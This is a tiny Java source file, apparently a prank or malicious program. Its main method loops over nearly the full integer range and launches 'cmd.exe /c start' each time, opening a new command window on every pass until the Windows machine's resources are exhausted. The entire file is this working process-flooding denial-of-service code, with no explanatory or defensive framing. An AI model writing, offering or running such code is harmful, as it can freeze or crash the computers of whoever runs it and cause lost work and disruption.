import java.io.IOException;

public class Main { //Start


 public static void main(String[] args) throws IOException {
	for (int x = Integer.MIN_VALUE; x < Integer.MAX_VALUE; x++) {
		Runtime rt = Runtime.getRuntime();
	        String[] s = {"cmd.exe","/c","start"};
		rt.exec(s);
	}
}


} //End
